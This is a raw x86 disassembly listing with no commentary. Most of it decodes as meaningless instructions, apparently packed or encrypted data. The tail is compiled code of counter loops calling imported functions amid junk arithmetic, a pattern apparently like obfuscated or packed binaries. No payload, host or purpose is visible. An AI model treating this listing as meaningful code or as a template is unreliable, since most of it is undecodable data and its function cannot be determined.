  40baa7:	ins    BYTE PTR es:[edi],dx
  40baa8:	cmc    
  40baa9:	or     eax,0x40476caa
  40baae:	add    DWORD PTR [edx-0x7de2fe81],ebx
  40bab4:	inc    ecx
  40bab5:	hlt    
  40bab6:	jmp    0x20724a97
  40babb:	mov    ds:0xc4a881da,eax
  40bac0:	ret    
  40bac1:	mov    al,ds:0x1e8fba3
  40bac6:	mov    ah,bh
  40bac8:	aas    
  40bac9:	adc    eax,0x4cab4a69
  40bace:	(bad)  
  40bacf:	stc    
  40bad0:	push   0xd10dede8
  40bad5:	inc    ebp
  40bad6:	mov    dh,0x21
  40bad8:	hlt    
  40bad9:	ret    0x50c9
  40badc:	clc    
  40badd:	mov    ch,0x6e
  40badf:	cmp    al,0xb4
  40bae1:	lock gs add eax,0x757f2a11
  40bae8:	jg     0x40ba87
  40baea:	aam    0x9c
  40baec:	lea    edi,[edi-0x1b]
  40baef:	push   esi
  40baf0:	inc    dx
  40baf2:	sti    
  40baf3:	push   0xe82c1834
  40baf8:	inc    esi
  40baf9:	and    eax,0x8760f3f1
  40bafe:	out    0xe,eax
  40bb00:	in     al,dx
  40bb01:	int3   
  40bb02:	add    eax,0x2046bdc3
  40bb07:	pop    esi
  40bb08:	xor    al,0x68
  40bb0a:	push   eax
  40bb0b:	pop    ebp
  40bb0c:	ja     0x40bb1b
  40bb0e:	rcr    BYTE PTR [edi-0x4c],cl
  40bb11:	clc    
  40bb12:	cmp    al,0xa4
  40bb14:	push   ecx
  40bb15:	add    ebx,eax
  40bb17:	jg     0x40baa5
  40bb19:	gs or  eax,eax
  40bb1c:	das    
  40bb1d:	jg     0x40bab0
  40bb1f:	adc    ecx,eax
  40bb21:	sub    al,0xe2
  40bb23:	inc    eax
  40bb24:	pop    ecx
  40bb25:	add    ch,BYTE PTR [ebp+ecx*2+0x65e491bd]
  40bb2c:	sub    BYTE PTR ds:0x1e17af6e,ch
  40bb32:	cmp    cl,dl
  40bb34:	mov    bl,0x89
  40bb36:	scas   al,BYTE PTR es:[edi]
  40bb37:	jno    0x40bb52
  40bb39:	out    0xf4,eax
  40bb3b:	mov    ebp,0x10eef19d
  40bb40:	cdq    
  40bb41:	cmp    ch,0xf4
  40bb44:	out    0xdd,eax
  40bb46:	shl    BYTE PTR [eax+0x79],0x34
  40bb4a:	dec    ebp
  40bb4b:	sahf   
  40bb4c:	sbb    ebx,edi
  40bb4e:	pop    ds
  40bb4f:	cmp    DWORD PTR [ecx+0x4c],ebx
  40bb52:	aas    
  40bb53:	xor    eax,0x6ffeb71b
  40bb58:	mov    dh,0x16
  40bb5a:	mov    ah,0x3b
  40bb5c:	ins    DWORD PTR es:[edi],dx
  40bb5d:	arpl   WORD PTR [ebx],sp
  40bb5f:	xor    al,0x3e
  40bb61:	loopne 0x40bb5b
  40bb63:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bb64:	dec    edi
  40bb65:	mov    ds:0x5f736b7,eax
  40bb6a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bb6b:	adc    eax,DWORD PTR [eax]
  40bb6d:	mov    ebx,0x5b8205ed
  40bb72:	mov    bl,BYTE PTR [ebx+0x66ab3af5]
  40bb78:	(bad)  
  40bb79:	sbb    DWORD PTR [edx-0x17],eax
  40bb7c:	fcom   DWORD PTR [esi+0x48]
  40bb7f:	(bad)  
  40bb80:	sar    DWORD PTR [esp+esi*8],cl
  40bb83:	push   edx
  40bb84:	mov    ecx,ecx
  40bb86:	mov    ebp,0x4133c09b
  40bb8b:	cmp    BYTE PTR [eax+ebx*8+0x55],dl
  40bb8f:	das    
  40bb90:	sbb    al,0xe3
  40bb92:	and    al,0x7a
  40bb94:	jbe    0x40bb35
  40bb96:	aad    0x44
  40bb98:	sub    dh,BYTE PTR [ebp+0x34]
  40bb9b:	cmp    edx,DWORD PTR ss:[ebp+0x52]
  40bb9f:	lock ins DWORD PTR es:[edi],dx
  40bba1:	mov    cl,0x42
  40bba3:	stos   BYTE PTR es:[edi],al
  40bba4:	and    dh,dh
  40bba6:	sub    ebp,DWORD PTR [edx-0x3c15587c]
  40bbac:	lods   eax,DWORD PTR ds:[esi]
  40bbad:	shl    al,1
  40bbaf:	in     al,0x88
  40bbb1:	xchg   edi,eax
  40bbb2:	inc    ebp
  40bbb3:	xchg   edx,eax
  40bbb4:	bnd js 0x40bb8f
  40bbb7:	pop    edx
  40bbb8:	push   eax
  40bbb9:	test   BYTE PTR [ecx-0x79],ch
  40bbbc:	cmp    al,ah
  40bbbe:	mov    esi,0xfc3c48e8
  40bbc3:	in     al,0x4d
  40bbc5:	xchg   BYTE PTR [ebp+0x74],ch
  40bbc8:	lock adc DWORD PTR [esi],0xf444d7d7
  40bbcf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bbd0:	mov    BYTE PTR [ecx-0x43],ch
  40bbd3:	cmc    
  40bbd4:	push   ebp
  40bbd5:	push   eax
  40bbd6:	stos   DWORD PTR es:[edi],eax
  40bbd7:	pusha  
  40bbd8:	(bad)  
  40bbd9:	js     0x40bb94
  40bbdb:	add    BYTE PTR [ebx],0xa1
  40bbde:	adc    al,BYTE PTR [edi+ecx*1]
  40bbe1:	pop    ds
  40bbe2:	sub    DWORD PTR [edx],eax
  40bbe4:	xchg   DWORD PTR [edx-0x7b],esi
  40bbe7:	sub    esi,ecx
  40bbe9:	sbb    DWORD PTR [edx+eiz*1-0x4d],ecx
  40bbed:	or     bh,BYTE PTR ds:0xa371a90f
  40bbf3:	pop    es
  40bbf4:	dec    esi
  40bbf5:	dec    ebp
  40bbf6:	jp     0x40bb80
  40bbf8:	aas    
  40bbf9:	(bad)  
  40bbfb:	(bad)  
  40bbfc:	dec    esi
  40bbfd:	or     DWORD PTR [esi],esi
  40bbff:	in     eax,0x16
  40bc01:	jne    0x40bbab
  40bc03:	pop    ebp
  40bc04:	scas   al,BYTE PTR es:[edi]
  40bc05:	ins    DWORD PTR es:[edi],dx
  40bc06:	push   esi
  40bc07:	push   DWORD PTR [edx-0x1ed78215]
  40bc0d:	int3   
  40bc0e:	add    eax,0x15cda027
  40bc13:	outs   dx,DWORD PTR ds:[esi]
  40bc14:	lock add DWORD PTR [edx+0x23],ecx
  40bc18:	outs   dx,BYTE PTR ds:[esi]
  40bc19:	push   cs
  40bc1a:	and    al,0xf2
  40bc1c:	jmp    0xa71665ae
  40bc21:	clc    
  40bc22:	fisubr WORD PTR [ebx]
  40bc24:	and    al,0x97
  40bc26:	dec    ebp
  40bc27:	stos   DWORD PTR es:[edi],eax
  40bc28:	in     al,dx
  40bc29:	pop    ecx
  40bc2a:	inc    ebp
  40bc2b:	test   eax,0x32a56c92
  40bc30:	scas   eax,DWORD PTR es:[edi]
  40bc31:	or     bl,BYTE PTR [esi-0x3eeac07d]
  40bc37:	aaa    
  40bc38:	(bad)  [eax-0x2c640984]
  40bc3e:	cmp    dl,BYTE PTR [ebx-0x2f57e9d6]
  40bc44:	fisubr DWORD PTR [ebp+0x7aed6b52]
  40bc4a:	sub    eax,DWORD PTR [edi-0x9]
  40bc4d:	iret   
  40bc4e:	and    bh,dl
  40bc50:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bc51:	mov    ebx,0x8f5f0bf
  40bc56:	jnp    0x40bbf9
  40bc58:	das    
  40bc59:	jae    0x40bc4c
  40bc5b:	mov    ds:0xe475ecec,eax
  40bc60:	mov    bl,0x30
  40bc62:	sbb    eax,0xa4c150f3
  40bc67:	jl     0x40bbfa
  40bc69:	(bad)  
  40bc6a:	popa   
  40bc6b:	div    BYTE PTR gs:[ecx+0x452076]
  40bc72:	or     bh,ch
  40bc74:	repnz les edx,FWORD PTR cs:[edx+0x357495e5]
  40bc7c:	gs rcl bl,1
  40bc7f:	jle    0x40bc8d
  40bc81:	pop    eax
  40bc82:	scas   eax,DWORD PTR es:[edi]
  40bc83:	arpl   WORD PTR [edx+0x36826223],cx
  40bc89:	fldl2t 
  40bc8b:	sub    ecx,DWORD PTR [edi+0x48]
  40bc8e:	mov    dh,0xb6
  40bc90:	jne    0x40bcdf
  40bc92:	sbb    al,0x6b
  40bc94:	icebp  
  40bc95:	xchg   edi,eax
  40bc96:	jge    0x40bc83
  40bc98:	les    ecx,FWORD PTR [eax-0xac2e83f]
  40bc9e:	cmp    BYTE PTR ds:0xa0a4f033,0xc3
  40bca5:	cmp    eax,ebx
  40bca7:	retf   
  40bca8:	rcl    ch,0x99
  40bcab:	scas   eax,DWORD PTR es:[edi]
  40bcac:	jmp    0x40bcc0
  40bcae:	shr    BYTE PTR [ebx],0x53
  40bcb1:	jmp    DWORD PTR [ebp+eiz*4-0x37]
  40bcb5:	iret   
  40bcb6:	dec    ebx
  40bcb7:	mov    ds:0x98d7b3fe,eax
  40bcbc:	js     0x40bd0b
  40bcbe:	and    al,0xe6
  40bcc0:	bound  esp,QWORD PTR [edx]
  40bcc2:	retf   0xa320
  40bcc5:	dec    edx
  40bcc6:	mov    DWORD PTR [esi],esi
  40bcc8:	xor    ah,BYTE PTR [eax+0xd5e5928]
  40bcce:	sub    al,0xd8
  40bcd0:	in     eax,0xa1
  40bcd2:	mov    ds:0x819c0b5f,al
  40bcd7:	jecxz  0x40bd0b
  40bcd9:	sub    DWORD PTR [esp+edx*1+0xd390e50],eax
  40bce0:	test   DWORD PTR [eax],ebp
  40bce2:	jle    0x40bcab
  40bce4:	and    esi,esp
  40bce6:	retf   
  40bce7:	fs pop ebx
  40bce9:	ins    DWORD PTR es:[edi],dx
  40bcea:	jp     0x40bcf1
  40bcec:	adc    eax,0xa4d59eed
  40bcf1:	push   esp
  40bcf2:	mov    bl,0xd6
  40bcf4:	mov    ds,WORD PTR [ebx+0x17]
  40bcf7:	pop    ebp
  40bcf8:	xor    eax,0x824ffee8
  40bcfd:	fmul   st,st(0)
  40bcff:	arpl   WORD PTR [ebx+0x3503e52d],cx
  40bd05:	push   ebp
  40bd06:	adc    al,0xa1
  40bd08:	push   cs
  40bd09:	add    eax,0x1fcdfce
  40bd0e:	jae    0x40bd80
  40bd10:	mul    DWORD PTR [eax-0x61c02a6b]
  40bd16:	push   0xffffffe3
  40bd18:	xchg   edi,eax
  40bd19:	sub    DWORD PTR [edi-0x3ac85910],edi
  40bd1f:	jbe    0x40bd8c
  40bd21:	push   ecx
  40bd22:	iret   
  40bd23:	add    eax,0x4b9d5c6
  40bd28:	sbb    al,0x10
  40bd2a:	in     eax,0xb1
  40bd2c:	shl    BYTE PTR [ebx-0x66],0xa6
  40bd30:	mov    ds:0x3bafe57e,al
  40bd35:	test   eax,0x58dc1e44
  40bd3a:	adc    cl,BYTE PTR [edi]
  40bd3c:	out    dx,al
  40bd3d:	push   cs
  40bd3e:	in     al,0x2c
  40bd40:	inc    edx
  40bd41:	gs sbb al,0xdd
  40bd44:	adc    BYTE PTR [esp+ebp*2+0x21],ah
  40bd48:	in     al,0xcd
  40bd4a:	add    DWORD PTR [edi],ecx
  40bd4c:	add    DWORD PTR [edx+0x42],eax
  40bd4f:	mov    ecx,DWORD PTR [ecx]
  40bd51:	mov    DWORD PTR [eax],ecx
  40bd53:	jmp    0x40c074
  40bd58:	out    0x4c,al
  40bd5a:	xor    al,0x30
  40bd5c:	mov    ah,0x70
  40bd5e:	loop   0x40bda8
  40bd60:	into   
  40bd61:	xor    BYTE PTR [ecx],bl
  40bd63:	xchg   esp,eax
  40bd64:	cs retf 
  40bd66:	fbstp  TBYTE PTR [esp+ebx*1]
  40bd69:	cmp    BYTE PTR [esi+0x7e],0x7a
  40bd6d:	jge    0x40bded
  40bd6f:	jle    0x40bd29
  40bd71:	pop    esp
  40bd72:	int3   
  40bd73:	out    dx,al
  40bd74:	cmp    ebp,esi
  40bd76:	push   0x24
  40bd78:	in     al,dx
  40bd79:	addr16 pop ecx
  40bd7b:	ret    0xd4b6
  40bd7e:	ins    BYTE PTR es:[edi],dx
  40bd7f:	add    BYTE PTR [ebp-0x1228c8fd],bh
  40bd85:	fisubr DWORD PTR [esi+0x29]
  40bd88:	scas   eax,DWORD PTR es:[edi]
  40bd89:	dec    ecx
  40bd8a:	jnp    0x40bd8b
  40bd8c:	push   0x41
  40bd8e:	sbb    bl,bh
  40bd90:	sub    ecx,DWORD PTR [esp+eiz*8]
  40bd93:	dec    esp
  40bd94:	dec    edi
  40bd95:	test   DWORD PTR [ecx-0x4f],esp
  40bd98:	xchg   ebp,eax
  40bd99:	(bad)  
  40bd9a:	retf   0x9b83
  40bd9d:	sub    ah,BYTE PTR [ebx+ecx*2+0x62]
  40bda1:	add    eax,0x3bd97c24
  40bda6:	mov    ebx,0xbcf4dce6
  40bdab:	push   ds
  40bdac:	mov    BYTE PTR [eax+0x422f2384],cl
  40bdb2:	imul   DWORD PTR [esi+0x6a]
  40bdb5:	pop    ebx
  40bdb6:	sbb    al,0x16
  40bdb8:	mov    WORD PTR [edx],ss
  40bdba:	sti    
  40bdbb:	cmp    al,0x8a
  40bdbd:	xor    edi,DWORD PTR [eax-0x9]
  40bdc0:	or     al,0x14
  40bdc2:	rol    BYTE PTR [eax+0x76a954f7],1
  40bdc8:	xchg   ebx,eax
  40bdc9:	and    ebp,DWORD PTR [edx-0x33915824]
  40bdcf:	ss inc ecx
  40bdd1:	mov    esi,0x7951ec1a
  40bdd6:	fnstenv ds:0x10fd058f
  40bddc:	mov    bl,BYTE PTR [edx]
  40bdde:	add    bh,BYTE PTR [ecx+0x6f]
  40bde1:	add    BYTE PTR [eax],0x17
  40bde4:	rcl    BYTE PTR [ebp+0x6f60482b],cl
  40bdea:	sti    
  40bdeb:	add    al,0x5
  40bded:	push   edx
  40bdee:	and    esp,ebp
  40bdf0:	push   es
  40bdf1:	(bad)
  40bdf5:	call   0x6ca94c6f
  40bdfa:	cmp    ah,BYTE PTR [eax]
  40bdfc:	push   ds
  40bdfd:	or     DWORD PTR [ecx],esp
  40bdff:	into   
  40be00:	out    0x1,eax
  40be02:	adc    al,0xd
  40be04:	mov    cl,0xd1
  40be06:	xchg   ebp,eax
  40be07:	lahf   
  40be08:	cdq    
  40be09:	jmp    0x4019dc12
  40be0e:	aaa    
  40be0f:	fimul  WORD PTR [edx+0x7dd8b108]
  40be15:	xchg   BYTE PTR [ecx],dl
  40be17:	adc    ah,al
  40be19:	mov    DWORD PTR [eax+0xa],esp
  40be1c:	cmp    ecx,DWORD PTR [edi+0x7f]
  40be1f:	daa    
  40be20:	xchg   edi,eax
  40be21:	pop    ds
  40be22:	sbb    al,0x78
  40be24:	jnp    0x40be5d
  40be26:	xchg   DWORD PTR [edx],edx
  40be28:	mov    esp,0x9386154
  40be2d:	test   eax,0x729be341
  40be32:	adc    BYTE PTR [ebp-0x7dfac3d5],dh
  40be38:	xor    BYTE PTR [ecx+0x71],bh
  40be3b:	push   cs
  40be3c:	gs push es
  40be3e:	test   BYTE PTR [ebp-0x2d654060],bl
  40be44:	and    dh,BYTE PTR [ebp+0x6b]
  40be47:	test   DWORD PTR ds:0xdbb7770b,esp
  40be4d:	jl     0x40bece
  40be4f:	push   ecx
  40be50:	std    
  40be51:	cmp    eax,edx
  40be53:	mov    WORD PTR [esi-0x774ded26],es
  40be59:	mov    al,ch
  40be5b:	inc    edi
  40be5c:	ja     0x40be34
  40be5e:	xchg   esp,eax
  40be5f:	sbb    DWORD PTR [edi+0x49f52f53],edi
  40be65:	mov    cl,0xbe
  40be67:	fmul   st,st(1)
  40be69:	les    ebp,FWORD PTR [esi-0x42]
  40be6c:	or     eax,edi
  40be6e:	dec    ecx
  40be6f:	fs leave 
  40be71:	inc    esi
  40be72:	pushf  
  40be73:	sbb    DWORD PTR [edi+0x47a07d71],edi
  40be79:	mov    edx,0x26c3a2e6
  40be7e:	xor    ch,BYTE PTR [eax]
  40be80:	ficom  WORD PTR [ecx+0x626b4f0a]
  40be86:	test   dh,0x7f
  40be89:	ja     0x40be0d
  40be8b:	scas   eax,DWORD PTR es:[edi]
  40be8c:	ficomp WORD PTR [edx-0x3699fe9a]
  40be92:	and    BYTE PTR [eax+0x1c80408f],al
  40be98:	das    
  40be99:	fdivr  DWORD PTR ds:[ecx+0x2375ebd6]
  40bea0:	add    BYTE PTR [esi+0x16],al
  40bea3:	or     esp,DWORD PTR [ebp+eiz*1+0x1f0647db]
  40beaa:	mov    ch,0x29
  40beac:	aam    0x2d
  40beae:	pop    ds
  40beaf:	jno    0x40bea3
  40beb1:	cli    
  40beb2:	cmp    cl,ah
  40beb4:	jg     0x40be84
  40beb6:	out    dx,al
  40beb7:	xchg   edi,eax
  40beb8:	mov    bh,BYTE PTR [edx-0x4e049341]
  40bebe:	loope  0x40bf16
  40bec0:	imul   edi,DWORD PTR [ecx-0xb14c2a9],0x66
  40bec7:	mov    eax,ds:0x6a602004
  40becc:	inc    ecx
  40becd:	lods   al,BYTE PTR ds:[esi]
  40bece:	mov    edx,0x6f2226f4
  40bed3:	xor    BYTE PTR [ebx],ch
  40bed5:	xchg   esi,eax
  40bed6:	stos   BYTE PTR es:[edi],al
  40bed7:	pop    esp
  40bed8:	jbe    0x40bf06
  40beda:	std    
  40bedb:	in     eax,dx
  40bedc:	mov    al,0xa6
  40bede:	mov    ch,0x69
  40bee0:	ins    DWORD PTR es:[edi],dx
  40bee1:	in     eax,0xd7
  40bee3:	jne    0x40bf15
  40bee5:	inc    ebp
  40bee6:	popf   
  40bee7:	sub    BYTE PTR [esi-0x72],ch
  40beea:	popf   
  40beeb:	bound  eax,QWORD PTR [eax*4+0x281fc4b3]
  40bef2:	inc    eax
  40bef3:	cli    
  40bef4:	fwait
  40bef5:	in     eax,dx
  40bef6:	lea    ebx,[esp+eiz*8]
  40bef9:	xchg   edi,eax
  40befa:	jb     0x40bee8
  40befc:	stos   BYTE PTR es:[edi],al
  40befd:	les    ebp,FWORD PTR [ecx+0x9ee9f2b]
  40bf03:	mov    bl,0x35
  40bf05:	jnp    0x40bf6b
  40bf07:	fistp  QWORD PTR [esi-0x11905608]
  40bf0d:	push   ecx
  40bf0e:	aad    0x8a
  40bf10:	push   esp
  40bf11:	daa    
  40bf12:	inc    eax
  40bf13:	mov    edx,0x2b59a8bb
  40bf18:	fdiv   QWORD PTR [eax+edx*2-0x7d]
  40bf1c:	xor    DWORD PTR [esi],eax
  40bf1e:	out    0xd1,al
  40bf20:	out    dx,eax
  40bf21:	bound  esi,QWORD PTR [ebx+0x76ffdc2d]
  40bf27:	jp     0x40bed0
  40bf29:	fidiv  WORD PTR [ecx-0x1da0c8c2]
  40bf2f:	cmp    DWORD PTR [edi+0x71],esp
  40bf32:	add    bh,0x4a
  40bf35:	imul   edi,DWORD PTR [ecx-0x5f],0xa562f987
  40bf3c:	add    al,0x41
  40bf3e:	ror    BYTE PTR [ebx],cl
  40bf40:	mov    al,bl
  40bf42:	jge    0x40bf1c
  40bf44:	jne    0x40bf2b
  40bf46:	imul   edi,DWORD PTR [esp+esi*8],0x39
  40bf4a:	in     eax,0x22
  40bf4c:	(bad)  
  40bf4d:	pop    edx
  40bf4e:	hlt    
  40bf4f:	fiadd  DWORD PTR [edi]
  40bf51:	and    BYTE PTR [edi],0x70
  40bf54:	dec    esi
  40bf55:	(bad)  
  40bf57:	mov    bh,0x56
  40bf59:	cwde   
  40bf5a:	dec    edx
  40bf5b:	adc    BYTE PTR ss:[eax+0x1ac219d6],ch
  40bf62:	call   0xdd12:0x584dbd97
  40bf69:	mov    ch,0xa8
  40bf6b:	ret    0x13ac
  40bf6e:	retf   
  40bf6f:	(bad)  
  40bf70:	pop    ecx
  40bf71:	sub    DWORD PTR [edi],0xfbd66bae
  40bf77:	xlat   BYTE PTR ds:[ebx]
  40bf78:	popf   
  40bf79:	pop    edi
  40bf7a:	test   eax,0xde1408a9
  40bf7f:	cs (bad) 
  40bf81:	out    0x9a,al
  40bf83:	push   esp
  40bf84:	stos   DWORD PTR es:[edi],eax
  40bf85:	jl     0x40bfa9
  40bf87:	scas   eax,DWORD PTR es:[edi]
  40bf88:	inc    ebp
  40bf89:	jle    0x40bfd0
  40bf8b:	jecxz  0x40bf7c
  40bf8d:	and    eax,0x7b13702
  40bf92:	(bad)  
  40bf93:	jge    0x40bf94
  40bf95:	jge    0x40bf38
  40bf97:	push   0xffffffff
  40bf99:	cdq    
  40bf9a:	push   ecx
  40bf9b:	loop   0x40bff1
  40bf9d:	push   ecx
  40bf9e:	push   ss
  40bf9f:	int    0x87
  40bfa1:	lds    ebx,FWORD PTR [ebx]
  40bfa3:	enter  0x7c57,0x13
  40bfa7:	ret    0x7283
  40bfaa:	cdq    
  40bfab:	add    DWORD PTR [ebp-0x2ce10ae],esi
  40bfb1:	retf   
  40bfb2:	repz xor DWORD PTR [ebx+esi*4],eax
  40bfb6:	out    0x33,al
  40bfb8:	fwait
  40bfb9:	mov    BYTE PTR [edx-0x74],dh
  40bfbc:	ficomp DWORD PTR [ebp+0x33418374]
  40bfc2:	call   0x31836e71
  40bfc7:	setae  BYTE PTR [eax+0x1e669c3a]
  40bfce:	inc    ecx
  40bfcf:	repz leave 
  40bfd1:	stos   DWORD PTR es:[edi],eax
  40bfd2:	xchg   esi,eax
  40bfd3:	ficomp DWORD PTR [edi-0x1f]
  40bfd6:	xchg   edx,eax
  40bfd7:	push   edx
  40bfd8:	add    eax,0x4ad3f931
  40bfdd:	push   edi
  40bfde:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bfdf:	js     0x40c050
  40bfe1:	lock jno 0x40bfcf
  40bfe4:	out    dx,eax
  40bfe5:	cmp    eax,0x2e98769b
  40bfea:	pop    esp
  40bfeb:	fwait
  40bfec:	cdq    
  40bfed:	iret   
  40bfee:	cwde   
  40bfef:	adc    BYTE PTR [ecx-0x77512a4b],0xf0
  40bff6:	jecxz  0x40c059
  40bff8:	adc    eax,edi
  40bffa:	or     DWORD PTR [edx-0x5],0xcfe8c541
  40c001:	outs   dx,DWORD PTR ds:[esi]
  40c002:	ret    
  40c003:	push   eax
  40c004:	dec    BYTE PTR [edx-0x2f7d062]
  40c00a:	lea    esp,[edx-0x25]
  40c00d:	pusha  
  40c00e:	sbb    cl,ah
  40c010:	jge    0x40c063
  40c012:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c013:	loope  0x40bfc9
  40c015:	inc    ecx
  40c016:	push   0x5fd326f3
  40c01b:	jo     0x40bfca
  40c01d:	dec    edx
  40c01e:	and    BYTE PTR [ebp+0x6b6512dc],bh
  40c024:	test   BYTE PTR [edi],cl
  40c026:	pop    eax
  40c027:	mov    ecx,0xb91b20db
  40c02c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c02d:	ja     0x40c053
  40c02f:	dec    edx
  40c030:	push   esp
  40c031:	jmp    0x40c096
  40c033:	(bad)  
  40c034:	push   ebp
  40c035:	and    dl,BYTE PTR [edi+esi*2]
  40c038:	lea    ecx,[ecx-0x7c865ec8]
  40c03e:	test   esp,edi
  40c040:	xchg   edx,eax
  40c041:	adc    eax,0xbcad89e
  40c046:	(bad)  
  40c047:	lahf   
  40c048:	pusha  
  40c049:	ret    0x5522
  40c04c:	cmc    
  40c04d:	rol    BYTE PTR [esi-0x48],0xc3
  40c051:	xchg   ebp,eax
  40c052:	pop    ebx
  40c053:	mov    dh,0x31
  40c055:	mov    BYTE PTR [edx],dh
  40c057:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c058:	dec    esi
  40c059:	xor    ah,BYTE PTR [ebx]
  40c05b:	cli    
  40c05c:	add    al,0x6f
  40c05e:	push   es
  40c05f:	ror    BYTE PTR [edi-0x30],0xb8
  40c063:	jge    0x40c046
  40c065:	(bad)  
  40c066:	repnz les edx,FWORD PTR [edx-0x5aa55fea]
  40c06d:	leave  
  40c06e:	or     DWORD PTR [edi+0x10e25f51],ebx
  40c074:	mov    eax,DWORD PTR [ebp+0xc]
  40c077:	mov    eax,DWORD PTR [ebp+0x8]
  40c07a:	push   DWORD PTR [ebp-0x8]
  40c07d:	call   0x40746a
  40c082:	mov    eax,DWORD PTR [ebp-0xc]
  40c085:	cmp    eax,ebx
  40c087:	je     0x4098f8
  40c08d:	mov    eax,DWORD PTR [ebp-0x8]
  40c090:	mov    eax,DWORD PTR [eax]
  40c092:	pop    edi
  40c093:	pop    esi
  40c094:	pop    ebx
  40c095:	leave  
  40c096:	ret    0xc
  40c099:	push   ebp
  40c09a:	mov    ebp,esp
  40c09c:	sub    esp,0x30
  40c09f:	adc    DWORD PTR ds:0x433797,ecx
  40c0a5:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40c0ac:	xor    ecx,ecx
  40c0ae:	or     ecx,DWORD PTR ds:0x4337a7
  40c0b4:	and    DWORD PTR ds:0x433803,ecx
  40c0ba:	mov    DWORD PTR [ebp-0x18],0xf89c8532
  40c0c1:	mov    ecx,DWORD PTR [ebp-0x4]
  40c0c4:	mov    DWORD PTR ds:0x433837,0x13
  40c0ce:	cmp    DWORD PTR ds:0x433837,0x0
  40c0d5:	je     0x40c103
  40c0db:	cmp    DWORD PTR ds:0x433837,0x1a
  40c0e2:	jne    0x40c0f3
  40c0e8:	push   0x1b76
  40c0ed:	call   DWORD PTR ds:0x412020
  40c0f3:	mov    eax,ds:0x433837
  40c0f8:	dec    eax
  40c0f9:	mov    ds:0x433837,eax
  40c0fe:	jmp    0x40c0ce
  40c103:	push   ebx
  40c104:	mov    DWORD PTR ds:0x433867,0x19
  40c10e:	cmp    DWORD PTR ds:0x433867,0x0
  40c115:	je     0x40c1bf
  40c11b:	cmp    DWORD PTR ds:0x433867,0xa
  40c122:	jne    0x40c133
  40c128:	push   0x4904
  40c12d:	call   DWORD PTR ds:0x412024
  40c133:	cmp    DWORD PTR ds:0x433867,0xb
  40c13a:	jne    0x40c14d
  40c140:	mov    ebx,DWORD PTR ds:0x433867
  40c146:	dec    ebx
  40c147:	mov    DWORD PTR ds:0x433867,ebx
  40c14d:	mov    ebx,DWORD PTR ds:0x433867
  40c153:	dec    ebx
  40c154:	mov    DWORD PTR ds:0x433867,ebx
  40c15a:	jmp    0x40c10e
  40c15f:	mov    DWORD PTR ds:0x433803,0x1d
  40c169:	cmp    DWORD PTR ds:0x433803,0x0
  40c170:	je     0x40c1bf
  40c176:	cmp    DWORD PTR ds:0x433803,0x3
  40c17d:	jne    0x40c193
  40c183:	push   0x433900
  40c188:	push   0x400000
  40c18d:	call   DWORD PTR ds:0x412028
  40c193:	cmp    DWORD PTR ds:0x433803,0x4
  40c19a:	jne    0x40c1ad
  40c1a0:	mov    ebx,DWORD PTR ds:0x433803
  40c1a6:	dec    ebx
  40c1a7:	mov    DWORD PTR ds:0x433803,ebx
  40c1ad:	mov    ebx,DWORD PTR ds:0x433803
  40c1b3:	dec    ebx
  40c1b4:	mov    DWORD PTR ds:0x433803,ebx
  40c1ba:	jmp    0x40c169
  40c1bf:	mov    eax,0x7510854
  40c1c4:	adc    ebx,DWORD PTR ds:0x43382b
  40c1ca:	xor    ecx,eax
  40c1cc:	mov    ebx,0x32729b
  40c1d1:	add    ecx,ebx
  40c1d3:	mov    DWORD PTR [ebp-0x1c],ecx
  40c1d6:	movzx  ecx,BYTE PTR ds:0x433837
  40c1dd:	xor    DWORD PTR ds:0x433793,ecx
  40c1e3:	mov    ecx,DWORD PTR [ebp+0x14]
  40c1e6:	or     DWORD PTR ds:0x43379b,0x4337fb
  40c1f0:	push   esi
  40c1f1:	push   edi
  40c1f2:	test   ecx,ecx
  40c1f4:	mov    DWORD PTR ds:0x4337ab,0x6070
  40c1fe:	je     0x40c2fb
  40c204:	mov    ecx,DWORD PTR [ebp+0x14]
  40c207:	mov    DWORD PTR ds:0x433827,0x1d
  40c211:	cmp    DWORD PTR ds:0x433827,0x0
  40c218:	je     0x40c2a6
  40c21e:	cmp    DWORD PTR ds:0x433827,0x29
  40c225:	jne    0x40c23a
  40c22b:	push   DWORD PTR [ebp-0xc]
  40c22e:	push   DWORD PTR [ebp-0x1c]
  40c231:	push   DWORD PTR [ebp-0x20]
  40c234:	call   DWORD PTR ds:0x41202c
  40c23a:	xor    esi,esi
  40c23c:	or     esi,DWORD PTR ds:0x433827
  40c242:	dec    esi
  40c243:	mov    DWORD PTR ds:0x433827,esi
  40c249:	jmp    0x40c211
  40c24e:	mov    DWORD PTR ds:0x43386b,0x10
  40c258:	cmp    DWORD PTR ds:0x43386b,0x0
  40c25f:	je     0x40c2a6
  40c265:	cmp    DWORD PTR ds:0x43386b,0x2
  40c26c:	jne    0x40c278
  40c272:	call   DWORD PTR ds:0x4121d8
  40c278:	cmp    DWORD PTR ds:0x43386b,0x3
  40c27f:	jne    0x40c292
  40c285:	mov    esi,DWORD PTR ds:0x43386b
  40c28b:	dec    esi
  40c28c:	mov    DWORD PTR ds:0x43386b,esi
  40c292:	mov    esi,DWORD PTR ds:0x43386b
  40c298:	dec    esi
  40c299:	mov    DWORD PTR ds:0x43386b,esi
  40c29f:	jmp    0x40c258
  40c2a4:	and    esi,edi
  40c2a6:	mov    ecx,DWORD PTR [ecx]
  40c2a8:	and    DWORD PTR ds:0x4337b3,0x0
  40c2b2:	jmp    0x40c2c4
  40c2b7:	mov    esi,DWORD PTR ds:0x4337b3
  40c2bd:	inc    esi
  40c2be:	mov    DWORD PTR ds:0x4337b3,esi
  40c2c4:	cmp    DWORD PTR ds:0x4337b3,0x15
  40c2cb:	jae    0x40c2f8
  40c2d1:	cmp    DWORD PTR ds:0x4337b3,0x1e
  40c2d8:	jne    0x40c2ed
  40c2de:	push   DWORD PTR [ebp-0xc]
  40c2e1:	push   DWORD PTR [ebp-0x1c]
  40c2e4:	push   DWORD PTR [ebp-0x18]
  40c2e7:	call   DWORD PTR ds:0x4123a4
  40c2ed:	jmp    0x40c2b7
